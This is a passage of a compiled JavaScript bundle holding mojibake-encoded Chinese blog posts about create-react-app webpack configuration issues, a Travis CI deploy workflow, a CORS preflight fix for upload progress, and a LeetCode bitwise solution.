ä½†è¿™ä¸ªwebpackçš„migratingå·²ç»ä¸å­˜åœ¨äº†ï¼Œæˆ–è®¸å½“æ—¶webpackå†™å¾—å’Œç°åœ¨ä¸ä¸€æ ·äº†ã€‚</p>\\n<p> æœ€ç»ˆè¿˜æ˜¯å°†identåŠ äº†å›å»ï¼Œå¹¶ä¸”æ³¨æ˜identæ˜¯å¿…è¦çš„ï¼Œç‰¹åˆ«æ˜¯å¼•å…¥å¤–éƒ¨cssçš„æ—¶å€™ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-16","timeArr":[2018,9,16,0,0,0,0],"title":"è®°å½•CRAçš„webpacké…ç½®æ›¾ç»çš„issue-1","uuid":"42db7875df4e226dd9de2945de9bc1f9b287114c","summary":"<p>âš webpack requires an identifier (ident) in options when {Function}/require is used (Complex Options).\\nThe ident can be freely named as long as it is unique. It\'s recommended to name it (ident: \'postcss\')</p>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-1","sha":"68bd27b56a1e0ed5a6a7ea8b9e7a53a8221e699d"}')},605:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>å…³äºUglifyçš„<code>compress</code></li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code> compress: {\\n    ecma: 5,\\n    warnings: false,\\n    // Disabled because of an issue with Uglify breaking seemingly valid code:\\n    // https://github.com/facebook/create-react-app/issues/2376\\n    // Pending further investigation:\\n    // https://github.com/mishoo/UglifyJS2/issues/2011\\n    comparisons: false,\\n    // Disabled because of an issue with Terser breaking valid code:\\n    // https://github.com/facebook/create-react-app/issues/5250\\n    // Pending futher investigation:\\n    // https://github.com/terser-js/terser/issues/120\\n    inline: 2,\\n  },</code></pre></code></pre><p>è¿™é‡Œæœ‰2ä¸ªé—®é¢˜</p>\\n<p>ç¬¬ä¸€ä¸ªæ˜¯<code>comparisons</code>çš„ä½œç”¨æ˜¯äºŒå…ƒè¿ç®—çš„ä¼˜åŒ–ï¼Œä¾‹å¦‚<code>a = !b &amp;&amp; !c &amp;&amp; !d &amp;&amp; !e</code>ä¼šè½¬æ¢æˆ<code>a=!(b||c||d||e)</code></p>\\n<p>2376é—®é¢˜æ˜¯ä½¿ç”¨äº†ä¸€ä¸ª<code>react-mapbox-gl</code>çš„ç»„ä»¶(googleåœ°å›¾)</p>\\n<p>ç¼–è¯‘åå‘ç”Ÿé”™è¯¯ï¼Œç»è¿‡è®¨è®ºè°ƒè¯•åï¼Œæ­£æ˜¯<code>comparisons</code>é€‰é¡¹å‡ºç°äº†é—®é¢˜ï¼Œ<code>Uglify</code>è®¤ä¸ºæ˜¯å…·ä½“ä»£ç ç¼–å†™æ²¡æœ‰ç¬¦åˆè§„èŒƒæ‰€å¯¼è‡´ã€‚</p>\\n<p>ç›´åˆ°18å¹´7æœˆï¼Œ<code>https://github.com/mapbox/mapbox-gl-js/pull/6956</code></p>\\n<p><code>react-mapbox-gl</code>ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ã€‚</p>\\n<p>ç¬¬äºŒä¸ª<code>inline</code>çš„ä½œç”¨æ˜¯å†…è”å‡½æ•°è°ƒç”¨</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>function simple(a,b){\\n return a+b\\n}\\nfucntion complex(){\\n  // ...\\n  let sum=simple(1,2)\\n  // ...\\n  return sum\\n}</code></pre></code></pre><p>å°†ä¼šè½¬æ¢ä¸º</p>\\n<pre><code><pre class=\\"hljs\\"><code>fucntion complex(){\\n  // ...\\n  let sum=1+2\\n  // ...\\n  return sum\\n}</code></pre></code></pre><p><code>inline:2</code>(ä¿®æ”¹å)ï¼šå†…è”è°ƒç”¨å¸¦å‚æ•°çš„ç®€å•å‡½æ•°</p>\\n<p><code>inline:3</code>(ä¿®æ”¹å‰)ï¼šå†…è”è°ƒç”¨å¸¦å‚æ•°å’Œå¸¦å˜é‡çš„ç®€å•å‡½æ•°</p>\\n<p>ä¸ªäººçŒœæµ‹ï¼šå…·ä½“å‡ºé”™åŸå› å¯èƒ½æ˜¯å˜é‡ä½¿ç”¨äº†ä½œç”¨åŸŸä»¥å¤–çš„ï¼Œå¯¼è‡´å†²çªã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-17","timeArr":[2018,9,17,0,0,0,0],"title":"è®°å½•CRAçš„webpacké…ç½®æ›¾ç»çš„issue-2","uuid":"09551be59c48cabd2ec9043da881b563d7044cbf","summary":"<ul>\\n<li>å…³äºUglifyçš„<code>compress</code></li>\\n</ul>\\n<pre class=\\"hljs\\"><code> compress: {\\n    ecma: 5,\\n    warnings: false,\\n    // Disabled because of an issue with Uglify breaking seemingly valid code:\\n    // ...</code></pre>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-2","sha":"727e95a1ec46dc90c1cfe467e84a90fa08aedfb0"}')},606:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li><code>terser</code>çš„é…ç½®output</li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>terserOptions: {\\n  ...\\n  output: {\\n    ...      \\n    // Turned on because emoji and regex is not minified properly using default\\n    // https://github.com/facebook/create-react-app/issues/2488\\n    ascii_only: true,\\n  },</code></pre></code></pre><p>è¿™é‡Œ2488é—®é¢˜æ˜¯æå‡ºäº†ä¸€ä¸ªemojiåœ¨prodæ¨¡å¼ä¸‹æ— æ³•æ­£å¸¸æ˜¾ç¤ºï¼Œç„¶åä¹Ÿæœ‰äººæå‡ºæ­£åˆ™åŒæ ·ä¼šå‡ºç°è¢«å‹ç¼©è¿‡æ»¤çš„bugã€‚</p>\\n<p>è¿™é‡Œéœ€è¦é…ç½®ä¸º<code>true</code>ï¼Œä¸å‹ç¼©Unicodeå­—ç¬¦ã€‚</p>\\n<ul>\\n<li><code>optimization</code>çš„<code>splitChunks</code></li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>optimization: {\\n    ...\\n    // Automatically split vendor and commons\\n    // https://twitter.com/wSokra/status/969633336732905474\\n    // https://medium.com/webpack/webpack-4-code-splitting-chunk-graph-and-the-splitchunks-optimization-be739a861366\\n    splitChunks: {\\n      chunks: \'all\',\\n      name: false,\\n    },\\n}</code></pre></code></pre><p>è¿™é‡Œæåˆ°äº†ä¸€ç¯‡åšæ–‡å’Œmediumæ–‡ç« ï¼Œéƒ½æ˜¯è®¤ä¸º<code>splitChunks</code>çš„chunksåº”è¯¥é…ç½®ä¸º<code>all</code>ï¼Œä»¥ä¾¿æ—¢å¯ä»¥æå–<code>async</code>ä¹Ÿå¯ä»¥æå–<code>sync</code>çš„æ¨¡å—ã€‚</p>\\n<p>è€Œ<code>name</code>å»ºè®®prodæ¨¡å¼è®¾ç½®ä¸ºfalseï¼Œä»¥ä¾¿å½“å˜æ›´çš„æ—¶å€™èƒ½åŠæ—¶æ›´æ–°ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-18","timeArr":[2018,9,18,0,0,0,0],"title":"è®°å½•CRAçš„webpacké…ç½®æ›¾ç»çš„issue-3","uuid":"f0f5a9f7c1ddeec7f61b8a95cfc5ec817c6bd3fb","summary":"<ul>\\n<li><code>terser</code>çš„é…ç½®output</li>\\n</ul>\\n<pre class=\\"hljs\\"><code>terserOptions: {\\n  ...\\n  output: {\\n    ...      \\n    // Turned on because emoji and regex is not minified properly using default\\n    //...</code></pre>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-3","sha":"578982e3d37ef324089ae9591f0a39802c74a3a1"}')},607:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>webpackçš„<code>sideEffect</code></li>\\n</ul>\\n<p>åœ¨é…ç½®css-loaderçš„å†…éƒ¨</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n  test: sassRegex,\\n  ...\\n  // Don\'t consider CSS imports dead code even if the\\n  // containing package claims to have no side effects.\\n  // Remove this when webpack adds a warning or an error for this.\\n  // See https://github.com/webpack/webpack/issues/6571\\n  sideEffects: true,\\n  },</code></pre></code></pre><p>è¿™é‡Œæœ‰ä¸ª<code>sideEffects</code>é…ç½®ï¼ŒsideEffecté…ç½®èƒ½è®©å¼€å‘è€…å»å‘Šè¯‰webpackï¼Œè¿™é‡Œæ˜¯ä¸æ˜¯æœ‰å‰¯ä½œç”¨ï¼Œ\\nå‰¯ä½œç”¨å¤§æ¦‚å°±æ˜¯æŒ‡ä¼šå½±å“åˆ°æ¨¡å—å¤–éƒ¨å†…å®¹ã€‚</p>\\n<p><code>CRA</code>è¿™é‡Œæå‡ºä¸ç”¨å»è€ƒè™‘cssçš„æ‘‡æ ‘ä¼˜åŒ–ã€‚</p>\\n<p>è¿™é‡Œç»™å‡ºäº†ä¸€ä¸ªissue6571ï¼Œä½†å®é™…é—®é¢˜åº”è¯¥ç”±\\n<a href=\\"https://github.com/facebook/create-react-app/issues/5140\\">https://github.com/facebook/create-react-app/issues/5140</a>\\nå¼€å§‹ã€‚</p>\\n<p>5140é—®é¢˜æå‡ºè€…æŒ‡å‡ºå½“ä»–è¿™ä¹ˆä½¿ç”¨</p>\\n<p><code>import &#39;react-octagon/lib/styles/semantic.css&#39;</code></p>\\n<p>åœ¨å¼€å‘æ¨¡å¼ä¸‹æ²¡æœ‰é—®é¢˜ï¼Œä½†ç”Ÿäº§æ¨¡å¼ä¸‹åˆ™è¿™æ®µcsséƒ½ä¸è§äº†ã€‚</p>\\n<p>ç»è¿‡è®¨è®ºä¸€ç•ªï¼ŒåŸå› æœ‰2ç‚¹ï¼š</p>\\n<ol>\\n<li><p>edmorleyæå‡º<code>react-octagon</code>åœ¨<code>package.json</code>å†…éƒ¨ä½¿ç”¨äº†<code>sideEffect:false</code> </p>\\n<blockquote>\\n<p>The react-octagon package has set sideEffects: false in their package.json:\\n <a href=\\"https://github.com/Tripwire/octagon/blob/v15.1.2/package.json#L98\\">https://github.com/Tripwire/octagon/blob/v15.1.2/package.json#L98</a></p>\\n</blockquote>\\n</li>\\n<li><p><code>CRA</code>æœªå¯¹sideEffectè¿›è¡Œé…ç½®ã€‚</p>\\n</li>\\n</ol>\\n<p>è¿™ä¸¤ä¸ªé—®é¢˜å¯¼è‡´webpackè®¤ä¸ºè¿™ä¸€æ®µ<code>import &#39;react-octagon/lib/styles/semantic.css&#39;</code>æ˜¯ä¸€ä¸ªä¸å«å‰¯ä½œç”¨çš„ï¼Œ\\nåœ¨æ‘‡æ ‘ä¼˜åŒ–çš„æ—¶å€™ä¾¿å°†å®ƒç›´æ¥å‰ªæ‰äº†ã€‚</p>\\n<p>æ¥ç€è¿›å…¥<code>https://github.com/webpack/webpack/issues/6571</code>é—®é¢˜</p>\\n<p>è¿™ä¸ªæ˜¯åœ¨<code>webpack</code>åº“ä¸Šçš„é—®é¢˜ï¼Œæå‡ºè€…è®¤ä¸º</p>\\n<p><code>import &#39;list/fantasy-land&#39;</code>åœ¨<code>sideEffect:false</code>çš„æƒ…å†µä¸‹åº”è¯¥è¢«å‰ªæ‰ã€‚</p>\\n<p>æ­¤æ¬¡çš„è®¨è®ºå¤§è‡´è§‚ç‚¹è®¤ä¸ºï¼Œå½“<code>import  xxx</code>çš„å†™æ³•æ—¶ï¼Œæ˜¯ä¸€ç§æš—ç¤ºæœ‰å‰¯ä½œç”¨çš„å¯¼å…¥ï¼Œä¸åº”è¯¥è¢«<code>sideEffect</code>å‰ªæ‰ã€‚</p>\\n<p>ä½†webpackæˆå‘˜<code>sokra</code><a href=\\"https://github.com/webpack/webpack/issues/6571#issuecomment-425666425\\">è®¤ä¸º</a>ï¼Œ\\nå½“è®¾ç½®äº†<code>sideEffect:false</code>çš„æƒ…å†µï¼Œå†å»<code>import xxx</code>æ˜¯ä¸€ç§ä¸æ­£ç¡®çš„å†™æ³•ï¼Œå¹¶ä¸”ä»–è®¤ä¸ºæˆ–è®¸æœªæ¥æ·»åŠ ä¸€ä¸ªwarningæ˜¯å¯ä»¥æ¥å—çš„ã€‚</p>\\n<p>ä»–ä¹Ÿè®¤ä¸ºæ‰€æœ‰çš„CSSæ–‡ä»¶éƒ½åº”è¯¥æ˜¯æœ‰å‰¯ä½œç”¨çš„ï¼Œå› ä¸ºCSSå†…éƒ¨çš„<code>import xxx</code>éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚</p>\\n<p>è‡³æ­¤ï¼Œ<code>CRA</code>ä½œè€…Danè®¤ä¸ºï¼Œåœ¨webpackå¯¹è¿™ç§<code>import xx</code>æ²¡æœ‰æç¤ºwarningæˆ–è€…errorä¹‹å‰ï¼Œæ‰€æœ‰CSSå†…å®¹éƒ½è®¤ä¸ºæ˜¯æœ‰å‰¯ä½œç”¨çš„<code>sideEffect:true</code>ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-25","timeArr":[2018,9,25,0,0,0,0],"title":"è®°å½•CRAçš„webpacké…ç½®æ›¾ç»çš„issue-4","uuid":"26521baed3a1e852019bad397f751e106be8b610","summary":"<ul>\\n<li>webpackçš„<code>sideEffect</code></li>\\n</ul>\\n<p>åœ¨é…ç½®css-loaderçš„å†…éƒ¨</p>\\n<pre class=\\"hljs\\"><code>{\\n  test: sassRegex,\\n  ...\\n  // Don\'t consider CSS imports dead code even if the\\n  // containing package claims to...</code></pre>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-4","sha":"c652978c17e0cd7fcf3dd94e0dab32551f0b884e"}')},608:function(n){n.exports=JSON.parse('{"content":"<p>é—®é¢˜åœ°å€ï¼š<a href=\\"https://github.com/facebook/create-react-app/issues/240\\">https://github.com/facebook/create-react-app/issues/240</a></p>\\n<p>è§¦å‘åŸå› ï¼š</p>\\n<p>åœ¨ä¸€æ¬¡å¤„ç†ç»„ä»¶çš„åˆ†å‰²å­ç»„ä»¶å’Œå¼•ç”¨æ—¶ï¼Œç”±äºå¤§å°å†™çš„å¤±è¯¯ï¼Œå¯¼è‡´çƒ­æ›´æ–°å¤±è´¥ã€‚</p>\\n<p>è§£å†³æ–¹æ¡ˆï¼š</p>\\n<p>æ·»åŠ æ’ä»¶ï¼š<code>case-sensitive-paths-webpack-plugin</code></p>\\n<p>æ’ä»¶ä½œç”¨ï¼šæ­¤Webpackæ’ä»¶å¼ºåˆ¶æ‰€æœ‰å¿…éœ€æ¨¡å—çš„å®Œæ•´è·¯å¾„ä¸ç£ç›˜ä¸Šå®é™…è·¯å¾„çš„ç¡®åˆ‡å¤§å°å†™ç›¸åŒ¹é…ã€‚</p>\\n<hr>\\n<p>é—®é¢˜åœ°å€ï¼š<a href=\\"https://github.com/facebook/create-react-app/issues/186\\">https://github.com/facebook/create-react-app/issues/186</a></p>\\n<p>è§¦å‘åŸå› ï¼š</p>\\n<p>å½“æ·»åŠ ä¸€ä¸ªæ¨¡å—åï¼Œå¹¶ä¸ä¼šè‡ªåŠ¨å°è¯•æ›´æ–°ã€‚</p>\\n<p>è§£å†³æ–¹æ¡ˆï¼š</p>\\n<p><code>CRA</code>æä¾›äº†ä¸€ä¸ª<code>./react-dev-utils/WatchMissingNodeModulesPlugin.js</code>æ’ä»¶ã€‚</p>\\n<p>æ’ä»¶ä½œç”¨ï¼šæ£€æµ‹ä¹‹å‰ä¸å­˜åœ¨çš„æ¨¡å—æ˜¯å¦å­˜åœ¨äº<code>node_module</code>è·¯å¾„ä¸Šï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™æ·»åŠ åˆ°å½“å‰çš„ä¾èµ–åˆ—è¡¨ä¸­ã€‚</p>\\n<hr>\\n<p>é—®é¢˜åœ°å€ï¼š<a href=\\"https://github.com/facebook/create-react-app/pull/4234\\">https://github.com/facebook/create-react-app/pull/4234</a></p>\\n<p>è§¦å‘åŸå› ï¼š</p>\\n<p>æ—©èµ·ä½¿ç”¨<code>UglifyJsPlugin</code>æ’ä»¶çš„æ—¶å€™ï¼Œå…¶ä¸­è®¾ç½®<code>ecma: 8</code>ï¼Œè¿™æ„å‘³ç€ä¸ä»…ä»…è§£æ<code>ecma8</code>çš„ä»£ç ï¼ŒåŒæ ·å°†ä»£ç å‹ç¼©è‡³<code>ecma8</code>ã€‚</p>\\n<p>è§£å†³æ–¹æ¡ˆï¼š</p>\\n<p>åˆ†é¡¹è®¾ç½®ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n  parse: {ecma: 8,...},\\n  compress: {ecma: 5,...},\\n  output: {ecma: 5,...},\\n}</code></pre></code></pre><p>è¿™ä¹ˆè®¾ç½®ï¼Œæ„æ€æ˜¯ï¼Œèƒ½å¤Ÿå¤„ç†<code>ecma8</code>çš„ä»£ç ï¼Œå‹ç¼©çš„ç‰ˆæœ¬æœ€ä½ä¸º<code>ecma5</code>ï¼Œä»£ç æ˜¾ç¤ºä¹Ÿä¸º<code>ecma5</code>ã€‚</p>\\n<p>æ³¨æ„ï¼šè¿™é‡Œ<code>compress</code>è®¾ç½®ä¸º<code>5</code>å¹¶ä¸ä¼šå°†ä»£ç ä»<code>es6</code>è½¬æ¢ä¸º<code>es5</code>åï¼Œå†å»å‹ç¼©ã€‚</p>\\n<p>ç›¸åï¼Œå¦‚æœè®¾ç½®<code>ecma:6</code>åï¼Œé‡åˆ°<code>es5</code>çš„ä»£ç ï¼Œåˆ™ä¼šè½¬æ¢ä¸º<code>es6</code>å†å‹ç¼©ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2019-05-16","timeArr":[2019,4,16,0,0,0,0],"title":"è®°å½•CRAçš„webpacké…ç½®æ›¾ç»çš„issue-5","uuid":"61201b4391ad7bf76e96a9ebee00ef017060bc32","summary":"<p>é—®é¢˜åœ°å€ï¼š<a href=\\"https://github.com/facebook/create-react-app/issues/240\\">https://github.com/facebook/create-react-app/issues/240</a></p>\\n<p>è§¦å‘åŸå› ï¼š</p>\\n<p>åœ¨ä¸€æ¬¡å¤„ç†ç»„ä»¶çš„åˆ†å‰²å­ç»„ä»¶å’Œå¼•ç”¨æ—¶ï¼Œç”±äºå¤§å°å†™çš„å¤±è¯¯ï¼Œå¯¼è‡´çƒ­æ›´...</p>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-5","sha":"8d6fcb285907c764f600268a93546755ad3d3afa"}')},609:function(n){n.exports=JSON.parse('{"content":"<p>ç¯å¢ƒï¼š3ä¸ªæ–‡ä»¶å¤¹</p>\\n<ul>\\n<li>blogs ç”¨äºå†™åšå®¢</li>\\n<li>create-my-blog ç”¨äºè·å–åšå®¢å†…å®¹å’Œåˆ›å»ºé™æ€åšå®¢é¡µé¢</li>\\n<li>stonehank.github.io ç”¨äºå±•ç¤ºåšå®¢</li>\\n</ul>\\n<p>é€ æˆæ–‡ä»¶å¤¹æ¯”è¾ƒç¹æ‚æ˜¯å› ä¸ºå½“æ—¶å†™çš„æ—¶å€™å¹¶æ²¡æœ‰æƒ³å»åœ¨githubåšä¸€ä¸ªåšå®¢é¡µé¢ã€‚</p>\\n<p>è‡ªåŠ¨æ„å»ºå‰çš„æµç¨‹ï¼š</p>\\n<p>|â€”blogs</p>\\n<p><code>git commit</code>å’Œ<code>git push</code>ä¸Šä¼ æœ€æ–°åšå®¢å†…å®¹</p>\\n<p>|â€”create-my-blog</p>\\n<ol>\\n<li><code>fetch</code>æœ€æ–°èµ„æº</li>\\n<li><code>git run test</code>æµ‹è¯•</li>\\n<li><code>git commit</code>ç¡®è®¤æ–‡ä»¶</li>\\n<li><code>npm run build</code>æ„å»ºé™æ€èµ„æº</li>\\n<li>æ‰‹åŠ¨copy<code>build</code>æ–‡ä»¶å¤¹çš„å†…å®¹è‡³<code>stonehank.github.io</code></li>\\n</ol>\\n<p>|â€”stonehank.github.io</p>\\n<p><code>git commit</code>å’Œ<code>git push</code>ä¸Šä¼ è‡³github</p>\\n<hr>\\n<p>è‡ªåŠ¨æ„å»ºè¿‡ç¨‹ä¸­å°†create-my-blogå’Œstonehank.github.ioä½œä¸ºä¸€ä¸ªä»“åº“çš„ä¸¤ä¸ªåˆ†æ”¯å¤„ç†ã€‚</p>\\n<hr>\\n<p>è‡ªåŠ¨æ„å»ºåçš„æµç¨‹ï¼š</p>\\n<p>|â€”blogs</p>\\n<p><code>git commit</code>å’Œ<code>git push</code>ä¸Šä¼ æœ€æ–°åšå®¢å†…å®¹</p>\\n<p>|â€”stonehank.github.io</p>\\n<ol>\\n<li><code>fetch</code>æœ€æ–°èµ„æº</li>\\n<li><code>git commit</code>å’Œ<code>git push</code></li>\\n</ol>\\n<p>è‡ªåŠ¨æ„å»ºè¿‡ç¨‹ï¼š</p>\\n<ol>\\n<li><code>npm run build</code>æ„å»ºé™æ€èµ„æº</li>\\n<li><code>git push</code>buildæ–‡ä»¶å¤¹å†…å®¹åˆ°<code>master</code>åˆ†æ”¯</li>\\n</ol>\\n<p>æµç¨‹åšä¸ªè®°å½•ã€‚ </p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-21","timeArr":[2018,9,21,0,0,0,0],"title":"è®°å½•ä¸€æ¬¡Travisæ„å»ºå‰åæµç¨‹","uuid":"34a2842eae3595228bf0ac5e118a4db4df7b7344","summary":"<p>ç¯å¢ƒï¼š3ä¸ªæ–‡ä»¶å¤¹</p>\\n<ul>\\n<li>blogs ç”¨äºå†™åšå®¢</li>\\n<li>create-my-blog ç”¨äºè·å–åšå®¢å†…å®¹å’Œåˆ›å»ºé™æ€åšå®¢é¡µé¢</li>\\n<li>stonehank.github.io ç”¨äºå±•ç¤ºåšå®¢</li>\\n</ul>\\n<p>é€ æˆæ–‡ä»¶å¤¹æ¯”è¾ƒç¹æ‚æ˜¯å› ä¸ºå½“æ—¶å†™çš„æ—¶å€™å¹¶æ²¡æœ‰æƒ³å»åœ¨githubåšä¸€ä¸ªåšå®¢é¡µé¢ã€‚</p>\\n<p>è‡ªåŠ¨æ„å»ºå‰çš„æµç¨‹ï¼š</p>\\n<p>|â€”blogs</p>\\n<p><code>git commit</code>...</p>","slug":"ji-lu-yi-ci-Travis-gou-jian-qian-hou-liu-cheng","sha":"e8224d6946122b6d3062e3637631d9202e32bd4c"}')},610:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yi-ci-xhruploadonprogress-yu-multiparty-da-pei-de-cai-keng-ji-lu\\">ä¸€æ¬¡xhr.upload.onprogressä¸multipartyæ­é…çš„è¸©å‘è®°å½•</h2>\\n<p>æœ‰ä¸€ä¸ª<a href=\\"https://github.com/stonehank/blogs/blob/master/07-26-%E9%80%9A%E8%BF%87blob%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E7%BB%AD%E4%BC%A0%E8%AE%B0%E5%BD%95(nodejs).md\\">åˆ†æ®µä¸Šä¼ çš„demo</a>ï¼Œè®¾å®šæ¯æ¬¡ä¸Šä¼ å¤§å°ä¸º1MBï¼Œä½†å½“ç½‘é€Ÿè¿‡æ…¢çš„æ—¶å€™ï¼Œè¿›åº¦æ¡ä¼šç­‰å¾…å¾ˆä¹…(1MBä¸Šä¼ å®Œæ¯•)\\næ‰ä¼šå¢åŠ å˜åŒ–ï¼Œäºæ˜¯æƒ³é€šè¿‡<code>xhr.onprogress</code>å¯¹å…¶è¿›è¡Œå®æ—¶ç›‘æ§</p>\\n<p>å› ä¸ºæ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œéœ€è¦ä½¿ç”¨<code>xhr.upload.onprogress</code>ï¼Œä½†ä¼šå‘å‡ºè·¨åŸŸé”™è¯¯</p>\\n<p>åŸæ¥<code>xhr.upload.onprogress</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªéç®€å•è¯·æ±‚ï¼Œéœ€è¦é¢„æ£€è¯·æ±‚ï¼Œè€Œé¢„æ£€è¯·æ±‚æ˜¯ä¸€ä¸ªOPTIONSæ–¹æ³•ï¼Œé»˜è®¤çš„è·¨åŸŸé…ç½®å¹¶ä¸æ”¯æŒOPTIONSæ–¹æ³•</p>\\n<p>è¿™å°±æ˜¯é—®é¢˜åŸå› </p>\\n<p>è§£å†³åŠæ³•ï¼š</p>\\n<p>é¦–å…ˆè¦åœ¨æœåŠ¡ç«¯æ·»åŠ OPTIONSå¤„ç†æ–¹æ³•</p>\\n<p><code>res.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;POST, GET, OPTIONS&quot;)</code></p>\\n<p>ç»“æœè¿˜æ˜¯ä¸è¡Œï¼ŒæŸ¥çœ‹æŠ¥é”™ä¿¡æ¯(æ­¤å¤„ä½¿ç”¨äº†<code>multiparty</code>å¯¹<code>formData</code>è§£æ)</p>\\n<pre><code><pre class=\\"hljs\\"><code>Error: missing content-type header</code></pre></code></pre><p>åŸæ¥åœ¨<code>multiparty</code>å†…éƒ¨ä½¿ç”¨<code>form.parse(req)</code>æ—¶ä¼šæ£€æµ‹<code>content-type</code>ï¼Œè€Œoptionsè¯·æ±‚ä¸å¸¦<code>content-type</code>ï¼Œå› æ­¤ä¼šè§¦å‘é”™è¯¯</p>\\n<p>å°è¯•1ï¼šåœ¨clientå†…éƒ¨è¿›è¡Œæ·»åŠ <code>xhr.setRequestHeader(&#39;content-type&#39;, &#39;multipart/form-data&#39;)</code>ï¼Œä½†æ˜¯optionså¹¶ä¸ä¼šå¸¦ä¸Šè¿™ä¸ªcontent-type</p>\\n<p>æœ€ç»ˆè§£å†³ï¼šé‡‡å–å½“methodä¸º<code>OPTIONS</code>æ—¶ï¼Œç›´æ¥è¿”å›204</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span>(req.method===<span class=\\"hljs-string\\">\\"OPTIONS\\"</span>){\\n    res.statusCode=<span class=\\"hljs-number\\">204</span>\\n    res.end()\\n  }<span class=\\"hljs-keyword\\">else</span>{\\n  <span class=\\"hljs-comment\\">//æ­¤å¤„ä¼šæ£€æµ‹content-typeï¼Œè€Œoptionsè¯·æ±‚ä¸å¸¦content-typeï¼Œå› æ­¤ä¼šè§¦å‘é”™è¯¯</span>\\n    form.parse(req)\\n  }</code></pre></code></pre>\\n","toc":[{"anchor":"yi-ci-xhruploadonprogress-yu-multiparty-da-pei-de-cai-keng-ji-lu","level":2,"text":"ä¸€æ¬¡xhr.upload.onprogressä¸multipartyæ­é…çš„è¸©å‘è®°å½•"}],"relatedTags":null,"created_at":"2018-08-18","timeArr":[2018,7,18,0,0,0,0],"title":"è®°å½•ä¸€æ¬¡xhr.upload.onprogresså¡«å‘","uuid":"f72ad63b02516bf71d570ecbf6c39488e64deb8e","summary":"<h4>ä¸€æ¬¡xhr.upload.onprogressä¸multipartyæ­é…çš„è¸©å‘è®°å½•</h4>\\n<p>æœ‰ä¸€ä¸ª[åˆ†æ®µä¸Šä¼ çš„demo](https://github.com/stonehank/blogs/blob/master/07-26-%E9%80%9A%E8%BF%87blob%E5%AE%9E%E7%8E%B0%E6%96...</p>","slug":"ji-lu-yi-ci-xhr.upload.onprogress-tian-keng","sha":"bc7ed8c6eae00e50c69810221c75724e5987c3ef"}')},611:function(n){n.exports=JSON.parse('{"content":"<p><a href=\\"https://leetcode.com/problems/single-number-ii/description/\\">åŸé¢˜ç›®ï¼š</a>\\n<code>LeetCode</code>çš„ä¸€ä¸ªé¢˜ç›®ï¼Œè¦æ±‚ç®—å‡ºæ•°ç»„ä¸­å•ç‹¬å‡ºç°çš„æ•°å­—</p>\\n<pre><code><pre class=\\"hljs\\"><code>Given a non-empty array of integers, every element appears three times except for one, which appears exactly once. Find that single one.\\n\\nNote:\\n\\nYour algorithm should have a linear runtime complexity. Could you implement it without using extra memory?\\n\\nExample 1:\\n\\nInput: [2,2,3,2]\\nOutput: 3\\nExample 2:\\n\\nInput: [0,1,0,1,0,1,99]\\nOutput: 99</code></pre></code></pre><p>é¢˜ç›®æœ‰ä¸€ä¸ªé™åˆ¶ï¼šç©ºé—´å¤æ‚åº¦<code>O(1)</code></p>\\n<p>è§£å†³ä»£ç (ç®€æ´åˆ°å‘æŒ‡)ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> singleNumber = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">nums</span>) </span>{\\n    <span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-number\\">0</span>,b=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> n <span class=\\"hljs-keyword\\">of</span> nums){\\n        a=(a^n) &amp; ~b\\n        b=(b^n) &amp; ~a\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> a\\n};</code></pre></code></pre>\\n<hr>\\n<p>æ€è·¯ï¼š</p>\\n<ol>\\n<li>æˆ‘ä»¬è¦è¿‡æ»¤å‡ºç°3ä¸ªçš„ï¼Œä¿ç•™å‡ºç°1ä¸ªçš„ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¸€ä¸ª<code>çŠ¶æ€æœº</code>ï¼Œå®ƒè¾¾åˆ°3æ—¶ä¸º0ï¼Œè¾¾åˆ°1æ—¶ä¸ºå®ƒæœ¬èº«</li>\\n<li>ä¸ºäº†å®Œæˆç¬¬ä¸€æ¡ï¼Œéœ€è¦2ä¸ªè¾…åŠ©å˜é‡<code>a</code>,<code>b</code>ï¼Œè¾¾åˆ°ä»¥ä¸‹çŠ¶æ€</li>\\n</ol>\\n<pre><code><pre class=\\"hljs\\"><code>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€  a  b\\nåˆå§‹å€¼  ã€€ã€€ã€€ã€€ ï¼š   0   0\\nç¬¬ä¸€æ¬¡ç¢°è§æŸä¸ªæ•°nï¼š   0   